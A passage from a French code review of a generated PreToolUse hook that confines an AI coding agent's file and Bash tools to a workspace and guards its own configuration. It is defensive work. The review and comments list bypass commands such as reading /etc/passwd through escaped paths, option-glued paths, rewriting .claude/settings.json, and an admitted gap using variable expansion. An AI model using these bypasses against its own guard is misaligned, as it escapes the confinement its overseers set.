# Revue scellée — B-24c/d : garde de confinement filesystem (commit 64ae955)

## Nature
Composant de SÉCURITÉ. Stories B-24c (génération de la garde) + B-24d (comportement +
journalisation). B-24a/b déjà sur main. Jugez le DIFF CUMULÉ vs origin/main.

HUITIÈME tour. Les 7 précédents ont été rejetés à juste titre ; chaque objection a été
REPRODUITE par exécution avant correction, aucune écartée sur parole. Deux défauts ont même
été trouvés par moi et corrigés sans qu'un relecteur les signale.

## INVENTAIRE DES 16 OBJECTIONS DES 8 TOURS — statut de chacune
T1 (REJECT 2/3), 6 critiques -> corrigées : tokens quotés · chemins Windows · relatifs sans
  préfixe · `.claude` parent · `rm -rf .claude` · traversal
T1 mineures : `mv` du script -> test dédié · double-compile -> 2 passes réelles
T2 : `C:Windows` sans séparateur -> regex élargie
  MINEURE DeepSeek « cwd non contraint sous ROOT » -> NON TRAITÉE alors ; revenue en
  CRITIQUE au T4. Leçon consignée : sur un composant de sécurité, une mineure non traitée
  est une critique dont l'exploit n'est pas encore trouvé.
T3 CRITIQUE : `shlex.split` ne sépare pas les opérateurs collés -> punctuation_chars
T4 CRITIQUE : `cwd` jamais validé -> validation en propre (auto-protection + confinement)
T5 CRITIQUE : le repli `commande.split()` réintroduisait T3 -> repli strict
T6 CRITIQUE (Gemini + Grok) : le repli ne retirait pas les guillemets -> ADR option C :
  SUPPRESSION de shlex et du repli ; un seul découpage qui NE PEUT PAS LEVER
T7 CRITIQUE : continuation de ligne bash non normalisée -> normalisée ; liste des
  transformations lexicales pré-découpage FERMÉE PAR MESURE du binaire bash (il n'y en a
  que deux : continuation de ligne et échappement backslash, toutes deux traitées)
T8 CRITIQUE (Gemini + Grok, ce diff) : chemin collé à un préfixe d'option
  (`dd if=/etc/passwd`, `curl -o.claude/settings.json`) -> R1 `=` délimiteur + R2 suffixe
  des fragments commençant par `-`, bornées par les conventions d'options POSIX/GNU
T8 MINEURE (Grok) : docstrings des tours 3 et 5 décrivant encore shlex et un repli
  inexistants -> réécrites ; tests et assertions inchangés

## Deux défauts trouvés par moi, non signalés par les relecteurs
1. `cat \/etc/passwd` : Bash lit /etc/passwd, le fragment brut n'étant pas absolu il se
   résolvait sous la racine -> autorisé à tort. Corrigé au T6.
2. FAUX VERT dans le rendu du crew de ce tour : les 12 nouveaux tests utilisaient
   `cwd=tmp_path`, or la racine est `tmp_path/"racine"` — le cwd était donc le PARENT de la
   racine. Les 7 tests de refus passaient par la validation du cwd (T4) et NON par le
   mécanisme visé : non-détectants. Corrigé en `cwd=racine`, détection confirmée par
   mutation. Signal qui l'a révélé : les 4 tests d'autorisation du même lot échouaient.

## Limite hors périmètre (documentée, assumée — ne pas REJETER pour ça)
On n'interprète PAS le shell : pas d'expansion `$VAR`, pas de substitution `$(...)`, pas de
globbing. `CIBLE=/etc/passwd; cat $CIBLE` n'est PAS arrêté — rôle d'une sandbox OS, hors
périmètre depuis l'origine. Les chemins contenant un espace ne sont pas captés en entier.

## Ce qu'il faut chercher — critères de réfutation explicites
REJECT si : (a) un chemin littéral hors racine passe ; (b) le confiné peut neutraliser sa
garde ; (c) vous identifiez une TROISIÈME transformation lexicale que bash applique avant le
découpage en mots (les deux connues sont traitées) ; (d) vous identifiez une autre CONVENTION
de collage d'un chemin à un préfixe que `=` ou l'agglutination après `-`.

## Diff CUMULÉ vs origin/main
~~~diff
diff --git a/src/forgeai/ide/guard_fs.py b/src/forgeai/ide/guard_fs.py
new file mode 100644
index 0000000..bb6680f
--- /dev/null
+++ b/src/forgeai/ide/guard_fs.py
@@ -0,0 +1,512 @@
+"""Génération et installation de la garde filesystem autonome (B-24).
+
+Pourquoi un script GÉNÉRÉ plutôt qu'un module du produit : la garde est
+branchée en hook PreToolUse chez l'utilisateur et doit survivre à la
+désinstallation de forgeai — elle n'importe donc jamais le produit, uniquement
+la stdlib. Trois principes la gouvernent :
+
+- fail-closed : toute exception interne, un stdin illisible ou un JSON
+  invalide se convertissent en REFUS (exit 2) ; un refus tient même si la
+  journalisation échoue ;
+- racine figée : la racine de confinement est résolue (``os.path.realpath``)
+  AU MOMENT DE LA GÉNÉRATION et embarquée en constante dans le script —
+  jamais dérivée du cwd à l'exécution, sinon le confinement suivrait le
+  confiné ;
+- auto-protection : même dans la racine, un outil d'écriture ne peut réécrire
+  ni la garde elle-même, ni le répertoire des hooks, ni ``settings.json`` —
+  une garde réécrivable par le confiné est du théâtre.
+
+Le format du registre JSONL répliqué dans le script généré est une duplication
+ASSUMÉE de celui de ``forgeai.core.registre`` : c'est un contrat de
+compatibilité avec la vérification de chaîne du produit, à faire évoluer de
+pair avec lui.
+"""
+
+from __future__ import annotations
+
+import os
+import sys
+from pathlib import Path
+
+from . import IDEError
+from .bootstrap import HookSpec
+
+__all__ = ["generate_guard_fs", "install_guard_fs"]
+
+# Source complet du script autonome déposé chez l'utilisateur. Trois
+# emplacements — __FORGEAI_ROOT__, __FORGEAI_REGISTRE__, __FORGEAI_ALLOW__ —
+# sont substitués par generate_guard_fs via repr() : jamais d'interpolation
+# nue dans du code généré. Chaîne brute : les séquences « \n » / « \r » du
+# script généré doivent rester des échappements littéraux dans le template.
+_SCRIPT_TEMPLATE = r'''#!/usr/bin/env python3
+"""Garde filesystem autonome générée par ForgeAI (B-24) — hook PreToolUse.
+
+Autonome par construction : stdlib uniquement, n'importe jamais forgeai, et
+survit donc à la désinstallation du produit. La racine de confinement est
+figée (realpath) au moment de la génération — jamais dérivée du cwd à
+l'exécution. Politique fail-closed : stdin illisible, JSON invalide ou toute
+exception interne se convertissent en REFUS (exit 2) ; un refus tient même si
+la journalisation échoue.
+
+CONTRAT ASSUMI : le format d'entrée du registre JSONL répliqué ici (seq, ts,
+type, actor, payload, prev_hash, hash sha256 du matériau canonique, ligne JSON
+compacte à clés triées) est celui de forgeai.core.registre. Cette duplication
+est volontaire : elle préserve la vérification de chaîne du produit. Toute
+évolution du format doit être coordonnée des deux côtés.
+"""
+
+import hashlib
+import json
+import os
+import sys
+import re
+import tempfile
+from datetime import datetime, timezone
+
+try:
+    import fcntl
+except ImportError:
+    # Windows : pas de flock — écriture sans verrou, contrat assumé.
+    fcntl = None
+
+ROOT = __FORGEAI_ROOT__
+REGISTRE_DEFAUT = __FORGEAI_REGISTRE__
+ALLOW_PATH = __FORGEAI_ALLOW__
+
+GENESIS = "0" * 64
+WRITE_TOOLS = ("Write", "Edit", "NotebookEdit", "Bash")
+PATH_KEYS = ("file_path", "path", "notebook_path")
+
+SCRIPT_PATH = os.path.realpath(__file__)
+# Le répertoire « .claude » ENTIER est protégé en écriture (O4) : hooks,
+# settings.json et toute cible sous .claude. HOOKS_DIR et SETTINGS_JSON
+# restent définis — couverts a fortiori par CLAUDE_DIR — pour la
+# lisibilité et les messages du registre.
+CLAUDE_DIR = os.path.realpath(os.path.join(ROOT, ".claude"))
+HOOKS_DIR = os.path.realpath(os.path.join(ROOT, ".claude", "hooks"))
+SETTINGS_JSON = os.path.realpath(os.path.join(ROOT, ".claude", "settings.json"))
+
+
+def _sous(chemin, prefixe):
+    # Contenance par composants via commonpath — jamais par préfixe de chaîne
+    # ("/atelier/b" n'est pas sous "/atelier/bc"). ValueError (chemins
+    # incomparables, ex. deux lecteurs Windows) signifie hors racine.
+    try:
+        commun = os.path.commonpath((os.path.normcase(chemin), os.path.normcase(prefixe)))
+    except ValueError:
+        return False
+    return commun == os.path.normcase(prefixe)
+
+
+def _resoudre(chemin, cwd):
+    # Backslash d'échappement : retrait avant résolution, sur POSIX uniquement.
+    # Sur POSIX, ``\/etc/passwd`` est lu par Bash comme ``/etc/passwd`` :
+    # sans retrait du backslash, le fragment brut n'est pas absolu et se
+    # résout contre le cwd en ``<racine>/\/etc/passwd`` — DANS la racine,
+    # donc autorisé à tort (contournement trivial). Sur Windows, le
+    # backslash est le séparateur natif, pas un échappement : on le
+    # conserve tel quel. Ce traitement couvre AUSSI les chemins venant de
+    # file_path (pas seulement ceux extraits de Bash).
+    if os.sep != chr(92):
+        chemin = chemin.replace(chr(92), "")
+    p = os.path.expanduser(chemin)
+    if not os.path.isabs(p):
+        p = os.path.join(cwd, p)
+    return os.path.realpath(p)
+
+
+def _ressemble_chemin(token):
+    # Un token « ressemble à un chemin littéral » si et seulement si :
+    # - il contient un séparateur : « / », le séparateur natif os.sep, ou
+    #   la barre oblique inverse Windows — chr(92) plutôt qu'un littéral,
+    #   pour ne dépendre d'aucun échappement dans la chaîne template ; OU
+    # - il commence par « ~ » ; OU
+    # - il commence par « . » : navigation (« . », « .. ») ou entrée
+    #   cachée (« .claude », « .env ») — dans les deux cas un chemin
+    #   littéral ; c'est ce qui capture la cible nue « .claude » de
+    #   « rm -rf .claude » (O4), qu'une règle limitée à « .. »/« . »
+    #   exacts laisserait passer. Un token non-chemin (commande, option)
+    #   ne commence pratiquement jamais par « . » ; OU
+    # - il débute par un lecteur Windows `X:` — avec séparateur (`C:\x`, `C:/x`)
+    #   OU sans (`C:x`, chemin relatif au répertoire courant du lecteur, tout
+    #   aussi valide sous Windows). Regex `^[A-Za-z]:`.
+    # Un token SANS séparateur et sans préfixe « ~ »/« . » (ex. « cat »,
+    # « rm », « -rf ») N'EST PAS un chemin : l'ajouter provoquerait des
+    # faux positifs massifs sur les commandes et leurs options.
+    # NOTE B-24d : les opérateurs shell font partie de la classe de
+    # découpage de `_candidats`, ils n'apparaissent donc jamais dans un
+    # fragment. Et même isolés ils ne ressembleraient pas à un chemin :
+    # par construction ils ne contiennent pas de séparateur et ne
+    # commencent ni par « ~ », ni par « . », ni par une lettre+« : ».
+    if not token:
+        return False
+    if "/" in token or os.sep in token or chr(92) in token:
+        return True
+    if token.startswith("~"):
+        return True
+    if token.startswith("."):
+        return True
+    if re.match(r"^[A-Za-z]:", token):
+        return True
+    return False
+
+
+def _candidats(tool_name, tool_input):
+    trouves = []
+    for cle in PATH_KEYS:
+        valeur = tool_input.get(cle)
+        if isinstance(valeur, str) and valeur:
+            trouves.append(valeur)
+    # Politique « chemins littéraux résolubles uniquement » : seuls les
+    # fragments qui ressemblent à un chemin littéral sont contrôlés.
+    #
+    # B-24c/d — UN SEUL découpage de la commande brute sur la classe des
+    # délimiteurs shell (``\s<>;|&()"'`$``), puis application du filtre
+    # ``_ressemble_chemin``. Aucune tokenisation de type shell : shlex et
+    # son repli re.split ont été rejetés par la revue scellée (chaque
+    # tour trouvait un opérateur ou un séparateur oublié, signal de
+    # conception). On n'extrait que des fragments LITTÉRAUX.
+    #
+    # B-24d tour 8 — collage d'un chemin à un préfixe d'option.
+    # Le collage d'un chemin à un préfixe d'option suit les conventions
+    # POSIX/GNU : séparateur ``=`` pour les options longues
+    # (``--file=...``, ``--target-directory=...``) et agglutination
+    # après ``-`` pour les options courtes (``-f...``, ``-o...``, etc.).
+    # Deux règles bornées par ces conventions les couvrent :
+    #
+    # R1. Le signe ``=`` est ajouté à la classe des délimiteurs : il
+    #     isole le préfixe d'option longue de son argument et couvre
+    #     aussi les affectations de variables d'environnement en
+    #     préfixe de commande (``VAR=/chemin cmd``).
+    # R2. Un fragment qui COMMENCE par ``-`` est une option (convention
+    #     universelle). On en extrait AUSSI le suffixe à partir du
+    #     premier caractère ouvrant un chemin (``/``, ``~``, ``.``).
+    #     Le fragment entier reste également candidat (les deux sont
+    #     contrôlés) ; les doublons sont évités par l'ensemble ``vus``.
+    #
+    # Conséquences : un fragment contenant un séparateur et composé de
+    # caractères hors délimiteurs ne peut PAS se cacher — s'il est dans
+    # la commande, le motif le trouve, qu'il soit entre guillemets,
+    # après une redirection, dans une substitution de commande, dans un
+    # heredoc ou collé à un préfixe d'option. Le découpage NE LÈVE PAS
+    # d'exception (re.split ne lève jamais sur des guillemets
+    # déséquilibrés) : le chemin dégradé ``try/except`` disparaît, et
+    # avec lui la porte de service qu'il constituait.
+    #
+    # Limite de périmètre inchangée : on n'interprète PAS le shell — pas
+    # d'expansion de variable (``$HOME``, ``${X}``), pas de substitution
+    # de commande (``$(...)``, ``...``), pas de globbing (``*``, ``?``,
+    # ``[...]``), pas de compréhension des quotes imbriquées au-delà du
+    # découpage. L'extraction porte sur des FRAGMENTS LITTÉRAUX.
+    if tool_name == "Bash":
+        commande = tool_input.get("command")
+        if isinstance(commande, str):
+            # bash supprime la continuation de ligne (backslash + saut
+            # de ligne) avant tout découpage (mesure). Sans cette
+            # normalisation, un chemin fragmenté par des continuations
+            # échappe au contrôle. Normalisation appliquée partout, y
+            # compris dans des guillemets simples où bash ne le ferait
+            # pas — sur-détection assumée, fail-closed. Avec le retrait
+            # du backslash dans _resoudre, cela couvre la liste
+            # COMPLÈTE et MESURÉE des transformations pré-découpage
+            # de bash.
+            commande = commande.replace(chr(92) + "\n", "")
+            DELIMITEURS = r"""[\s<>;|&()"'`$=]+"""
+            fragments = [f for f in re.split(DELIMITEURS, commande) if f]
+            # Règle R2 : un fragment commençant par ``-`` est une
+            # option. On extrait le suffixe à partir du premier
+            # caractère ouvrant un chemin (``/``, ``~``, ``.``). Le
+            # fragment entier reste également candidat (les deux
+            # contrôlent). Dédoublonnage par ``vus`` pour ne pas
+            # accumuler la même cible sous deux formes.
+            OUVRE_CHEMIN = re.compile(r"[/~.]")
+            vus = set()
+            for fragment in fragments:
+                if _ressemble_chemin(fragment) and fragment not in vus:
+                    trouves.append(fragment)
+                    vus.add(fragment)
+                if fragment.startswith("-"):
+                    m = OUVRE_CHEMIN.search(fragment)
+                    if m:
+                        suffixe = fragment[m.start():]
+                        if _ressemble_chemin(suffixe) and suffixe not in vus:
+                            trouves.append(suffixe)
+                            vus.add(suffixe)
+    return trouves
+
+
+def _exceptions():
+    # tempfile.gettempdir() résolu, plus chaque ligne non vide du fichier
+    # d'exceptions s'il existe. Un fichier illisible ne lève pas : on reste
+    # étroit (fail-closed) plutôt que de s'autoriser ce qu'on ne vérifie pas.
+    prefixes = [os.path.realpath(tempfile.gettempdir())]
+    if os.path.exists(ALLOW_PATH):
+        try:
+            with open(ALLOW_PATH, "r", encoding="utf-8") as fh:
+                lignes = fh.read().splitlines()
+        except OSError:
+            lignes = []
+        for ligne in lignes:
+            ligne = ligne.strip()
+            if ligne:
+                prefixes.append(os.path.realpath(os.path.expanduser(ligne)))
+    return prefixes
+
+
+def _auto_protege(tool_name, resolu):
+    # Même DANS la racine, un outil d'écriture ne peut toucher ni ce
+    # script, ni le répertoire « .claude » ENTIER — lui-même ou toute
+    # cible sous lui (hooks, settings.json, etc.) : la garde qui se
+    # laisse réécrire par le confiné est du théâtre. SCRIPT_PATH est
+    # testé isolément car le script peut vivre HORS de .claude. Ce
+    # contrôle précède les exceptions pour n'être jamais contourné par
+    # le fichier d'exceptions.
+    if tool_name not in WRITE_TOOLS:
+        return False
+    cible = os.path.normcase(resolu)
+    if cible == os.path.normcase(SCRIPT_PATH):
+        return True
+    if cible == os.path.normcase(CLAUDE_DIR):
+        return True
+    if _sous(resolu, CLAUDE_DIR):
+        return True
+    return False
+
+def _journaliser(tool, demande, resolu, cwd):
+    # Réplique exacte du format de forgeai.core.registre (contrat de
+    # compatibilité avec la vérification de chaîne du produit) : seq et
+    # prev_hash dérivés du registre lu, ts UTC à la seconde, hash sha256 du
+    # matériau canonique (entrée sans « hash », clés triées, JSON compact
+    # UTF-8), ligne écrite en JSON compact trié suivie de « \n », flock
+    # LOCK_EX quand fcntl existe, fsync avant de rendre.
+    registre = os.environ.get("FORGEAI_REGISTRE", REGISTRE_DEFAUT)
+    entries = []
+    if os.path.exists(registre):
+        with open(registre, "r", encoding="utf-8") as fh:
+            for ligne in fh:
+                ligne = ligne.strip()
+                if ligne:
+                    entries.append(json.loads(ligne))
+    prev_hash = entries[-1]["hash"] if entries else GENESIS
+    entry = {
+        "seq": len(entries) + 1,
+        "ts": datetime.now(timezone.utc).isoformat(timespec="seconds"),
+        "type": "guard_fs_denied",
+        "actor": "guard-fs",
+        "payload": {
+            "tool": tool,
+            "chemin_demande": demande,
+            "chemin_resolu": resolu,
+            "racine": ROOT,
+            "cwd": cwd,
+        },
+        "prev_hash": prev_hash,
+    }
+    materiau = json.dumps(
+        {k: v for k, v in entry.items() if k != "hash"},
+        sort_keys=True,
+        ensure_ascii=False,
+        separators=(",", ":"),
+    ).encode("utf-8")
+    entry["hash"] = hashlib.sha256(materiau).hexdigest()
+    ligne = json.dumps(entry, sort_keys=True, ensure_ascii=False, separators=(",", ":"))
+    parent = os.path.dirname(registre)
+    if parent:
+        os.makedirs(parent, exist_ok=True)
+    with open(registre, "a", encoding="utf-8") as fh:
+        if fcntl is not None:
+            fcntl.flock(fh.fileno(), fcntl.LOCK_EX)
+        try:
+            fh.seek(0, os.SEEK_END)
+            fh.write(ligne + "\n")
+            fh.flush()
+            os.fsync(fh.fileno())
+        finally:
+            if fcntl is not None:
+                fcntl.flock(fh.fileno(), fcntl.LOCK_UN)
+
+
+def _refuser(tool, demande, resolu, cwd, motif):
+    # Message d'UNE ligne : outil, chemin résolu refusé, racine. La
+    # journalisation est tentée AVANT de sortir ; si elle échoue, la raison
+    # est ajoutée au message — le refus tient TOUJOURS.
+    message = "forgeai-guard-fs: REFUS outil={0} chemin={1} racine={2} motif={3}".format(
+        tool, resolu, ROOT, motif
+    )
+    message = message.replace("\r", " ").replace("\n", " ")
+    try:
+        _journaliser(tool, demande, resolu, cwd)
+    except Exception as exc:
+        raison = str(exc).replace("\r", " ").replace("\n", " ")
+        message += " (journalisation impossible: {0})".format(raison)
+    sys.stderr.write(message + "\n")
+    raise SystemExit(2)
+
+
+def _refus_structurel(motif):
+    # Refus avant extraction : pas de chemin résolu à journaliser.
+    motif = motif.replace("\r", " ").replace("\n", " ")
+    sys.stderr.write("forgeai-guard-fs: REFUS racine={0} motif={1}\n".format(ROOT, motif))
+    raise SystemExit(2)
+
+
+def _decider():
+    try:
+        brut = sys.stdin.read()
+    except Exception as exc:
+        _refus_structurel("stdin illisible: {0}".format(exc))
+    try:
+        payload = json.loads(brut)
+    except ValueError as exc:
+        _refus_structurel("JSON stdin invalide: {0}".format(exc))
+    if not isinstance(payload, dict):
+        _refus_structurel("charge JSON non-objet")
+    tool_name = payload.get("tool_name")
+    if not isinstance(tool_name, str) or not tool_name:
+        _refus_structurel("tool_name absent ou invalide")
+    cwd = payload.get("cwd")
+    if not isinstance(cwd, str) or not cwd:
+        _refus_structurel("cwd absent ou invalide")
+    # Fail-closed : un cwd relatif rendrait la résolution des chemins
+    # relatifs ambiguë — refus structurel avant toute décision.
+    if not os.path.isabs(cwd):
+        _refus_structurel("cwd non absolu: {0}".format(cwd))
+    tool_input = payload.get("tool_input")
+    if tool_input is None:
+        tool_input = {}
+    if not isinstance(tool_input, dict):
+        _refus_structurel("tool_input non-objet")
+    # Le cwd est validé en propre, avant l'extraction des candidats : un
+    # cwd non contraint transforme tout nom de fichier nu (sans séparateur,
+    # donc jamais extrait comme candidat) en accès arbitraire — ce que le
+    # contrôle des candidats ne peut pas rattraper par construction.
+    cwd_resolu = os.path.realpath(cwd)
+    exceptions = _exceptions()
+    # Auto-protection AVANT confinement (comme pour les candidats) : un cwd
+    # sous .claude est refusé même si .claude est sous ROOT — depuis ce
+    # cwd, tout nom nu écrirait dans le répertoire de la garde. _sous
+    # inclut l'égalité (commonpath d'un chemin avec lui-même).
+    if tool_name in WRITE_TOOLS and _sous(cwd_resolu, CLAUDE_DIR):
+        _refuser(tool_name, cwd, cwd_resolu, cwd, "cwd sous auto-protection")
+    # Confinement : ROOT lui-même et tout descendant sont acceptés, ainsi
+    # que tout cwd sous une exception explicite (tempdir, fichier allow).
+    if not _sous(cwd_resolu, ROOT) and not any(
+        _sous(cwd_resolu, prefixe) for prefixe in exceptions
+    ):
+        _refuser(tool_name, cwd, cwd_resolu, cwd, "cwd hors racine")
+    candidats = _candidats(tool_name, tool_input)
+    if not candidats:
+        return  # Aucun chemin candidat : AUTORISER (exit 0).
+    for demande in candidats:
+        resolu = _resoudre(demande, cwd_resolu)
+        if _auto_protege(tool_name, resolu):
+            _refuser(tool_name, demande, resolu, cwd, "auto-protection")
+        if any(_sous(resolu, prefixe) for prefixe in exceptions):
+            continue  # Candidat dans une exception explicite : autorisé.
+        if not _sous(resolu, ROOT):
+            _refuser(tool_name, demande, resolu, cwd, "hors racine")
+    # Tous les candidats sont conformes : AUTORISER (exit 0).
+
+
+def main():
+    # Fail-closed global : TOUTE exception interne devient un REFUS exit 2
+    # avec la raison sur stderr. SystemExit (autorisation implicite exit 0 ou
+    # refus explicite exit 2) est laissé intact.
+    try:
+        _decider()
+    except SystemExit:
+        raise
+    except Exception as exc:
+        raison = str(exc).replace("\r", " ").replace("\n", " ")
+        sys.stderr.write(
+            "forgeai-guard-fs: REFUS racine={0} motif=erreur interne: {1}\n".format(ROOT, raison)
+        )
+        raise SystemExit(2)
+
+
+if __name__ == "__main__":
+    main()
+'''
+
+
+def _chemin_embarque(chemin: str | os.PathLike[str]) -> str:
+    """expanduser puis absolu, au moment de la génération.
+
+    Un chemin relatif embarqué dans le script généré serait résolu contre un
+    cwd imprévisible à l'exécution du hook — même piège que la racine mobile,
+    même remède : figer à la génération.
+    """
+    return os.path.abspath(os.path.expanduser(os.fspath(chemin)))
+
+
+def generate_guard_fs(
+    workspace_root: str | os.PathLike[str],
+    *,
+    registre_path: str | os.PathLike[str] | None = None,
+    allow_path: str | os.PathLike[str] | None = None,
+) -> str:
+    """Retourne le source complet de la garde, substitutions faites.
+
+    ``workspace_root`` est figé par ``os.path.realpath`` AU MOMENT DE LA
+    GÉNÉRATION (décision B-24 : la racine ne doit jamais être dérivée du cwd
+    à l'exécution). Une racine inexistante lève ``IDEError`` : générer une
+    garde pour une racine fantôme est un piège silencieux.
+
+    ``registre_path`` (défaut ``~/.forgeai/Registres/mission.jsonl``) et
+    ``allow_path`` (défaut ``~/.forgeai/guard-fs.allow``) sont expanduser à la
+    génération. Les trois chemins sont injectés via ``repr`` — jamais
+    d'interpolation nue dans du code généré.
+    """
+    root = os.path.realpath(os.fspath(workspace_root))
+    if not os.path.exists(root):
+        raise IDEError(f"generate_guard_fs: racine de workspace inexistante : {root}")
+    registre = (
+        _chemin_embarque(registre_path)
+        if registre_path is not None
+        else _chemin_embarque("~/.forgeai/Registres/mission.jsonl")
+    )
+    allow = (
+        _chemin_embarque(allow_path)
+        if allow_path is not None
+        else _chemin_embarque("~/.forgeai/guard-fs.allow")
+    )
+    script = _SCRIPT_TEMPLATE
+    for jeton, valeur in (
+        ("__FORGEAI_ROOT__", root),
+        ("__FORGEAI_REGISTRE__", registre),
+        ("__FORGEAI_ALLOW__", allow),
+    ):
+        if jeton not in script:
+            raise IDEError(f"generate_guard_fs: emplacement {jeton} absent du template")
+        script = script.replace(jeton, repr(valeur))
+    return script
+
+
+def install_guard_fs(
+    dest_dir: str | os.PathLike[str],
+    *,
+    python_executable: str | None = None,
+) -> tuple[Path, HookSpec]:
+    """Écrit la garde dans ``<dest_dir>/.claude/hooks/`` et retourne son hook.
+
+    Le script est écrit en UTF-8, mode 0o755, à
+    ``<dest_dir>/.claude/hooks/forgeai_guard_fs.py`` (répertoires parents
+    créés). La commande du hook épingle l'interpréteur ABSOLU capturé au
+    bootstrap (``sys.executable`` par défaut — jamais « python » nu, le PATH
+    n'est pas garanti chez l'utilisateur) et le chemin absolu du script.
+
+    Retourne ``(chemin_absolu_du_script, HookSpec PreToolUse matcher "*")``.
+    """
+    dest = Path(dest_dir)
+    script_path = (dest / ".claude" / "hooks" / "forgeai_guard_fs.py").resolve()
+    contenu = generate_guard_fs(dest)
+    script_path.parent.mkdir(parents=True, exist_ok=True)
+    script_path.write_text(contenu, encoding="utf-8")
+    script_path.chmod(0o755)
+    python = python_executable if python_executable is not None else sys.executable
+    hook = HookSpec(
+        event="PreToolUse",
+        command=f'"{python}" "{script_path}"',
+        matcher="*",
+    )
+    return script_path, hook
diff --git a/tests/test_guard_fs.py b/tests/test_guard_fs.py
new file mode 100644
index 0000000..2c9040d
--- /dev/null
+++ b/tests/test_guard_fs.py
@@ -0,0 +1,1117 @@
+"""Tests du module ``forgeai.ide.guard_fs`` (B-24c/d).
+
+Chaque test fonctionnel exécute RÉELLEMENT le script de garde généré, via
+``subprocess.run([sys.executable, script], input=json.dumps(charge),
+text=True, capture_output=True)``, et asserte le code de sortie ET l'effet
+(message de refus sur stderr, entrée de registre, chaîne validée par le
+verify officiel). Aucun mock.
+
+Précautions d'herméticité :
+
+- ``registre_path`` et ``allow_path`` sont TOUJOURS redirigés sous tmp_path à
+  la génération — les tests n'écrivent jamais dans le ``~/.forgeai`` réel ;
+- pour le script produit par ``install_guard_fs`` (chemins embarqués par
+  défaut), la journalisation est redirigée via la variable d'environnement
+  ``FORGEAI_REGISTRE`` lue par la garde ;
+- pytest place tmp_path sous ``tempfile.gettempdir()`` : or la garde autorise
+  par défaut tout chemin sous le tempdir. Les tests qui exigent un REFUS sur
+  une cible située sous tmp_path isolent donc le ``TMPDIR`` du subprocess
+  dans un répertoire dédié (fixture ``env_tmpdir``).
+"""
+
+import json
+import os
+import stat
+import subprocess
+import sys
+import tempfile
+from pathlib import Path
+
+import pytest
+
+from forgeai.ide import IDEError
+from forgeai.ide.bootstrap import HookSpec
+from forgeai.ide.guard_fs import generate_guard_fs, install_guard_fs
+
+REPO_RACINE = Path(__file__).resolve().parents[1]
+REGISTRE_PY = REPO_RACINE / "scripts" / "registre.py"
+
+
+def run(script, charge, env=None):
+    """Exécute le script de garde sur une charge de hook -> (exit, stderr).
+
+    ``charge`` est un dict (sérialisé en JSON) ou une chaîne brute — les
+    chaînes servent aux cas fail-closed (stdin vide, JSON invalide). ``env``
+    est fusionné PAR-DESSUS os.environ : le subprocess hérite du reste.
+    """
+    entree = charge if isinstance(charge, str) else json.dumps(charge)
+    environ = dict(os.environ)
+    if env:
+        environ.update(env)
+    proc = subprocess.run(
+        [sys.executable, str(script)],
+        input=entree,
+        text=True,
+        capture_output=True,
+        env=environ,
+    )
+    return proc.returncode, proc.stderr
+
+
+def charge(outil, tool_input=None, cwd=None):
+    """Construit une charge de hook PreToolUse minimale mais valide."""
+    return {
+        "tool_name": outil,
+        "tool_input": {} if tool_input is None else tool_input,
+        "cwd": str(cwd),
+    }
+
+
+def ecrire_garde(tmp_path, racine, *, registre=None, allow=None, nom="forgeai_guard_fs.py"):
+    """Génère la garde pour ``racine`` et en écrit le source sous tmp_path.
+
+    registre/allow basculent par défaut sous tmp_path : aucun test ne touche
+    le ``~/.forgeai`` réel de la machine.
+    """
+    src = generate_guard_fs(
+        racine,
+        registre_path=registre if registre is not None else tmp_path / "registre.jsonl",
+        allow_path=allow if allow is not None else tmp_path / "guard-fs.allow",
+    )
+    script = tmp_path / nom
+    script.write_text(src, encoding="utf-8")
+    return script
+
+
+@pytest.fixture
+def racine(tmp_path):
+    root = tmp_path / "racine"
+    root.mkdir()
+    return root
+
+
+@pytest.fixture
+def env_tmpdir(tmp_path):
+    """TMPDIR isolé pour le subprocess de garde.
+
+    tmp_path vit sous tempfile.gettempdir() ; sans cette isolation,
+    l'exception tempdir de la garde AUTORISERAIT des cibles de test placées
+    sous tmp_path alors qu'elles doivent être REFUSÉES (tests 6 et 10).
+    """
+    dossier = tmp_path / "guard-tmpdir"
+    dossier.mkdir()
+    return {"TMPDIR": str(dossier)}
+
+
+# 1. Racine inexistante -> IDEError.
+def test_generate_racine_inexistante_leve_ideerror(tmp_path):
+    with pytest.raises(IDEError):
+        generate_guard_fs(tmp_path / "n-existe-pas")
+
+
+# 2. Le source rendu compile et ne contient plus aucun marqueur.
+def test_source_genere_compile_et_sans_marqueurs(tmp_path):
+    root = tmp_path / "racine"
+    root.mkdir()
+    src = generate_guard_fs(root)
+    compile(src, "<guard_fs>", "exec")  # lève SyntaxError si invalide
+    for marqueur in ("__FORGEAI_ROOT__", "__FORGEAI_REGISTRE__", "__FORGEAI_ALLOW__"):
+        assert marqueur not in src, f"marqueur non substitué : {marqueur}"
+
+
+# 3. install_guard_fs écrit le script et rend le HookSpec attendu.
+def test_install_ecrit_script_et_rend_hookspec(tmp_path):
+    dest = tmp_path / "projet"
+    dest.mkdir()
+    script_path, hook = install_guard_fs(dest)
+    attendu = (dest / ".claude" / "hooks" / "forgeai_guard_fs.py").resolve()
+    assert script_path == attendu
+    assert script_path.is_file()
+    assert script_path.stat().st_size > 0
+    assert stat.S_IMODE(script_path.stat().st_mode) == 0o755
+    assert isinstance(hook, HookSpec)
+    assert hook.event == "PreToolUse"
+    assert hook.matcher == "*"
+    assert f'"{sys.executable}"' in hook.command
+    assert f'"{script_path}"' in hook.command
+
+
+# 4. Lecture DANS la racine -> exit 0.
+def test_lecture_dans_racine_autorisee(tmp_path, racine):
+    cible = racine / "notes.txt"
+    cible.write_text("bonjour", encoding="utf-8")
+    script = ecrire_garde(tmp_path, racine)
+    code, err = run(script, charge("Read", {"file_path": str(cible)}, cwd=racine))
+    assert code == 0, err
+
+
+# 5. Lecture HORS racine -> exit 2.
+def test_lecture_hors_racine_refusee(tmp_path, racine):
+    script = ecrire_garde(tmp_path, racine)
+    code, err = run(script, charge("Read", {"file_path": "/etc/passwd"}, cwd=racine))
+    assert code == 2
+    assert "REFUS" in err
+
+
+# 6. Écriture qui SORT via .. -> exit 2.
+def test_ecriture_sortant_par_point_point_refusee(tmp_path, racine, env_tmpdir):
+    script = ecrire_garde(tmp_path, racine)
+    cible = f"{racine}/../evil.txt"
+    code, err = run(
+        script,
+        charge("Write", {"file_path": cible, "content": "x"}, cwd=racine),
+        env=env_tmpdir,
+    )
+    assert code == 2
+    assert "REFUS" in err
+
+
+# 7. Bash avec un chemin littéral hors racine -> exit 2.
+def test_bash_chemin_litteral_hors_racine_refuse(tmp_path, racine):
+    script = ecrire_garde(tmp_path, racine)
